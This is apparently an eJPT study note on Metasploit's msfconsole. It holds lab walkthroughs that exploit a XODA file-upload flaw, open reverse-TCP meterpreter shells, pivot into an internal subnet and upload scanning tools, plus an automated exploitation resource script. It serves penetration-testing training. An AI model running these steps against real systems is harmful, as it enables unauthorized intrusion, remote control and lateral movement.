# üîß Metasploit Framework - MSFConsole Commands

Comprehensive exploitation framework providing tools for vulnerability research, exploit development, and penetration testing.
**Location:** `07-exploitation/metasploit-framework/metasploit-basics/msfconsole-commands.md`

## üéØ What is Metasploit Framework?
Metasploit Framework is the world's most popular penetration testing framework, providing a comprehensive platform for exploit development, payload generation, and vulnerability assessment. MSFConsole is the primary interface offering interactive access to exploits, auxiliary modules, payloads, and post-exploitation tools.

Key capabilities include:
- **2426 exploits** for various vulnerabilities
- **1250 auxiliary modules** for scanning and enumeration
- **428 post-exploitation modules** for maintaining access
- **1468 payloads** with multiple delivery methods
- **47 encoders** for payload obfuscation
- **11 NOPs generators** for buffer alignment

## üì¶ Installation and Setup
Metasploit comes pre-installed on Kali Linux and most penetration testing distributions.

### Prerequisites:
- Ruby runtime environment
- PostgreSQL database (recommended)
- Sufficient disk space (5+ GB)

### Installation Verification:
```bash
# Start MSFConsole
msfconsole

# Check version and stats
version
# Expected output: metasploit v6.4.12-dev with module statistics

# Update framework
msfupdate
```

### Database Setup:
```bash
# Initialize Metasploit database
msfdb init

# Start database service
systemctl start postgresql

# Connect database in MSFConsole
db_connect
```

## üîß Basic Usage and Syntax

### Basic Workflow:
1. **Start MSFConsole:** Launch the framework interface
2. **Search Exploits:** Find relevant exploits for target vulnerabilities
3. **Select Module:** Choose and configure the appropriate exploit
4. **Set Parameters:** Configure RHOSTS, payloads, and options
5. **Execute:** Launch the exploit and establish session
6. **Post-Exploitation:** Use gained access for further reconnaissance

### Command Structure:
```bash
# Basic MSFConsole startup
msfconsole

# Module selection and configuration
use exploit/category/exploit_name
set RHOSTS target_ip
set payload payload/type/payload_name
exploit

# Session management
sessions -l
sessions -i session_id
```

## ‚öôÔ∏è Essential MSFConsole Commands

### Core Navigation Commands:
| Command | Purpose | Example |
|---------|---------|---------|
| `help` | Display help information | `help` |
| `search` | Search for modules | `search xoda` |
| `use` | Select a module | `use exploit/unix/webapp/xoda_file_upload` |
| `info` | Show module information | `info` |
| `show` | Display available options | `show options` |
| `set` | Configure module parameters | `set RHOSTS 192.168.1.100` |
| `unset` | Remove parameter values | `unset RHOSTS` |
| `exploit` | Execute the selected module | `exploit` |

### Search and Information Commands:
| Command | Purpose | Example |
|---------|---------|---------|
| `search type:exploit` | Search by module type | `search type:exploit platform:linux` |
| `search cve:2019` | Search by CVE year | `search cve:2019-0708` |
| `search name:upload` | Search by name pattern | `search name:file_upload` |
| `info -d` | Detailed module information | `info -d` |
| `show exploits` | List all available exploits | `show exploits` |
| `show payloads` | List compatible payloads | `show payloads` |

### Session Management Commands:
| Command | Purpose | Example |
|---------|---------|---------|
| `sessions -l` | List active sessions | `sessions -l` |
| `sessions -i 1` | Interact with session | `sessions -i 1` |
| `sessions -k 1` | Kill specific session | `sessions -k 1` |
| `sessions -K` | Kill all sessions | `sessions -K` |
| `background` | Background current session | `background` |

### Module Configuration Commands:
| Command | Purpose | Example |
|---------|---------|---------|
| `show options` | Display module options | `show options` |
| `show advanced` | Show advanced options | `show advanced` |
| `show evasion` | Display evasion options | `show evasion` |
| `show targets` | List available targets | `show targets` |
| `set target 0` | Select specific target | `set target 0` |
| `setg RHOSTS` | Set global variable | `setg RHOSTS 192.168.1.0/24` |

## üß™ Real Lab Examples

### Example 1: XODA File Upload Exploitation
```bash
# Phase 1: Start MSFConsole and search for XODA exploit
msfconsole
msf6 > search xoda

# Output: Shows exploit/unix/webapp/xoda_file_upload module

# Phase 2: Select and configure the exploit
msf6 > use exploit/unix/webapp/xoda_file_upload
msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS demo1.ine.local
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.63.4.2

# Phase 3: Execute exploitation
msf6 exploit(unix/webapp/xoda_file_upload) > exploit

# Output: 
# [*] Started reverse TCP handler on 192.63.4.2:4444
# [*] Sending PHP payload (3bxiDM.php)
# [*] Executing PHP payload (3bxiDM.php)
# [*] Sending stage (39927 bytes) to 192.63.4.3:55022
# [!] Deleting 3bxiDM.php
# [*] Meterpreter session 1 opened (192.63.4.2:4444 ‚Üí 192.63.4.3:55022)

meterpreter >
```

### Example 2: Post-Exploitation Network Discovery
```bash
# Phase 1: Establish shell from meterpreter session
meterpreter > shell
Process 801 created.
Channel 0 created.

# Phase 2: Network interface discovery
ip addr

# Output: Network interfaces showing eth0 and eth1 with different subnets
# eth0: 192.63.4.3/24 (original network)
# eth1: 192.180.108.2/24 (pivot network)

# Phase 3: Add route for network pivoting
# Background the session first (CTRL+Z)
meterpreter > background
msf6 exploit(unix/webapp/xoda_file_upload) > run autoroute -s 192.180.108.2

# Output: Route added to 192.180.108.2/255.255.255.0 via 192.63.4.3
```

### Example 3: Auxiliary Module Port Scanning
```bash
# Phase 1: Select and configure port scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.180.108.3
msf6 auxiliary(scanner/portscan/tcp) > set verbose false
msf6 auxiliary(scanner/portscan/tcp) > set ports 1-1000
msf6 auxiliary(scanner/portscan/tcp) > exploit

# Output: Port scan results
# [+] 192.180.108.3: - 192.180.108.3:22 - TCP OPEN
# [+] 192.180.108.3: - 192.180.108.3:21 - TCP OPEN
# [+] 192.180.108.3: - 192.180.108.3:80 - TCP OPEN
# [*] 192.180.108.3: - Scanned 1 of 1 hosts (100% complete)
```

### Example 4: Session Management and File Transfer
```bash
# Phase 1: Upload tools to compromised system
meterpreter > upload /root/static-binaries/nmap /tmp/nmap
# [*] Uploading: /root/static-binaries/nmap ‚Üí /tmp/nmap
# [*] Uploaded -1.00 B of 5.82 MiB (0.0%): /root/static-binaries/nmap ‚Üí /tmp/nmap
# [*] Completed: /root/static-binaries/nmap ‚Üí /tmp/nmap

meterpreter > upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
# [*] Uploading: /root/bash-port-scanner.sh ‚Üí /tmp/bash-port-scanner.sh
# [*] Completed: /root/bash-port-scanner.sh ‚Üí /tmp/bash-port-scanner.sh

# Phase 2: Execute uploaded tools
meterpreter > shell
cd /tmp/
chmod +x ./nmap ./bash-port-scanner.sh

# Phase 3: Run port scan on pivot network
./bash-port-scanner.sh 192.180.108.3

# Output: Discovered open ports
# port 21 is open (FTP)
# port 22 is open (SSH)
# port 80 is open (HTTP)
```

## üéØ eJPT Exam Focus

### Essential Skills for eJPT (90% Exam Coverage):
- **Basic Module Usage** (25% importance) - Search, select, and configure exploits
- **Session Management** (20% importance) - Handle meterpreter and shell sessions
- **Network Pivoting** (20% importance) - Route through compromised systems
- **File Upload Exploits** (15% importance) - Web application exploitation
- **Post-Exploitation** (10% importance) - Information gathering and persistence

### Critical Commands to Master:
```bash
# Must-know commands with explanations
msfconsole                    # Primary framework interface
use exploit/path/to/exploit   # Select exploitation module
set RHOSTS target_ip         # Configure target system
set LHOST attacker_ip        # Set listener IP address
exploit                      # Execute the selected exploit
sessions -i 1                # Interact with established session
run autoroute -s network     # Add routing for network pivoting
background                   # Background active session for multitasking
```

### eJPT Exam Scenarios:
1. **Web Application Exploitation Scenario:**
   - Required skills: File upload exploitation, basic web enumeration
   - Expected commands: `search file_upload`, `use exploit/unix/webapp/*`, `set RHOSTS/TARGETURI`
   - Success criteria: Establish meterpreter session on target web server

2. **Network Pivoting Scenario:**
   - Required skills: Multi-network navigation, routing configuration
   - Expected commands: `run autoroute`, `use auxiliary/scanner/*`, `sessions -l`
   - Success criteria: Discover and scan systems on internal networks

3. **Session Management Scenario:**
   - Required skills: Multiple session handling, shell interaction
   - Expected commands: `sessions -i`, `shell`, `background`, file upload/download
   - Success criteria: Maintain access and transfer tools between systems

### Exam Tips and Tricks:
- **Tip 1:** Always use `show options` before running any module to verify configuration
- **Tip 2:** Background sessions immediately after establishment to maintain multiple access points
- **Tip 3:** Use `setg RHOSTS` for global variables when scanning multiple targets
- **Tip 4:** Document all successful exploits with screenshots of session establishment

### Common eJPT Questions:
- How to configure and execute file upload exploits using Metasploit
- Network pivoting techniques through compromised systems
- Session management and maintaining persistent access

## ‚ö†Ô∏è Common Issues & Troubleshooting

### Issue 1: Module Not Found or Search Returns No Results
**Problem:** Search commands return empty results or "No modules matched your search" error
**Cause:** Outdated module database or incorrect search syntax
**Solution:**
```bash
# Update Metasploit framework
msfupdate

# Reload module database
reload_all

# Use broader search terms
search file upload
search type:exploit webapp
```

### Issue 2: Exploit Fails with "Handler Failed to Bind"
**Problem:** Cannot establish reverse connection due to port binding issues
**Cause:** LHOST incorrectly configured or port already in use
**Solution:**
```bash
# Check correct local IP address
ip addr show

# Set correct LHOST (usually eth0 or tun0 interface)
set LHOST 192.168.1.100

# Change default port if 4444 is busy
set LPORT 4445
```

### Issue 3: Session Dies Immediately After Establishment
**Problem:** Meterpreter session closes instantly after successful exploitation
**Prevention:**
```bash
# Use staged payloads for better reliability
set payload linux/x64/meterpreter/reverse_tcp

# Increase session timeout
set SessionExpirationTimeout 0
set SessionCommunicationTimeout 300
```

### Issue 4: Cannot Route Through Compromised System
**Problem:** Autoroute fails to establish routing for network pivoting
**Optimization:**
```bash
# Verify session is active
sessions -l

# Add route manually with correct session ID
route add 192.168.100.0 255.255.255.0 1

# Verify routing table
route print
```

## üîó Integration with Other Tools

### Primary Integration: Nmap ‚Üí MSFConsole ‚Üí Post-Exploitation Tools
```bash
# Complete workflow showing tool integration
nmap -sV target_ip > scan_results.txt                    # Initial reconnaissance
msfconsole -r exploit_script.rc                          # Automated exploitation
# MSFConsole processes Nmap results to select appropriate exploits
# Established sessions provide platform for additional tool deployment

# Explanation of each step:
# Step 1: Nmap identifies services and versions
# Step 2: MSFConsole matches vulnerabilities to available exploits
# Step 3: Successful exploitation provides persistent access for tool deployment
```

### Secondary Integration: MSFConsole ‚Üí Auxiliary Modules ‚Üí External Scanners
```bash
# How MSFConsole coordinates with scanning modules
use auxiliary/scanner/portscan/tcp                       # Internal port scanning
set RHOSTS 192.168.1.0/24                              # Target network range
run                                                      # Execute scan
# Results feed into exploit module selection process
```

### Advanced Workflows:
```bash
# Complex multi-stage exploitation scenario
use exploit/multi/handler                                # Establish listener
set payload windows/meterpreter/reverse_tcp             # Configure payload
exploit -j                                               # Run as background job
use auxiliary/scanner/smb/smb_version                   # Network enumeration
use post/multi/recon/local_exploit_suggester           # Post-exploitation analysis
```

## üìù Documentation and Reporting

### Evidence Collection Requirements:
1. **Screenshots:** Session establishment, exploit execution results, network discovery outputs
2. **Command Outputs:** All MSFConsole commands with timestamps and results
3. **Log Files:** Session logs, exploit attempts, and error messages
4. **Configuration Files:** Module configurations and payload settings

### Report Template Structure:
```markdown
## Metasploit Framework Results

### Target Information
- Target: target_identifier
- Date/Time: timestamp
- Framework Version: metasploit v6.4.12-dev

### Exploits Executed
#### Exploit: exploit/unix/webapp/xoda_file_upload
- **RHOSTS:** demo1.ine.local
- **TARGETURI:** /
- **LHOST:** 192.63.4.2
- **Result:** Successful - Session 1 established

#### Session Details
- **Session ID:** 1
- **Session Type:** Meterpreter
- **Target OS:** Linux
- **Privileges:** www-data
- **Network Access:** 192.63.4.3 (eth0), 192.180.108.2 (eth1)

### Network Pivoting Results
- **Added Routes:** 192.180.108.0/24 via 192.63.4.3
- **Discovered Systems:** 192.180.108.3 (FTP, SSH, HTTP services)
- **Additional Access:** Port scanning through compromised system

### Key Findings
- Successfully exploited XODA file upload vulnerability
- Established persistent meterpreter session with dual network access
- Identified additional target systems through network pivoting
- Confirmed file upload and execution capabilities on target system

### Recommendations
- Patch XODA application to latest version
- Implement file upload restrictions and validation
- Segment internal networks to prevent lateral movement
- Monitor for unusual network traffic patterns
```

### Automation Scripts:
```bash
# MSFConsole resource script for automated exploitation
# save as: auto_exploit.rc
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit -j

# Session management automation
sessions -l
sessions -i 1
run post/multi/recon/local_exploit_suggester
```

## üìö Additional Resources

### Official Documentation:
- Official Metasploit website: https://www.metasploit.com
- Framework documentation: https://docs.metasploit.com
- GitHub repository: https://github.com/rapid7/metasploit-framework

### Learning Resources:
- Metasploit Unleashed course: https://www.offensive-security.com/metasploit-unleashed/
- Rapid7 blog and tutorials: https://blog.rapid7.com
- eJPT preparation labs: Practice XODA exploitation scenarios

### Community Resources:
- Metasploit Community forums: https://community.rapid7.com
- Discord penetration testing communities
- Reddit r/metasploit and r/AskNetsec

### Related Tools:
- **MSFVenom:** Payload generation and encoding (companion tool)
- **Cobalt Strike:** Commercial post-exploitation framework (advanced alternative)
- **Empire/Starkiller:** PowerShell-based post-exploitation (complementary framework)
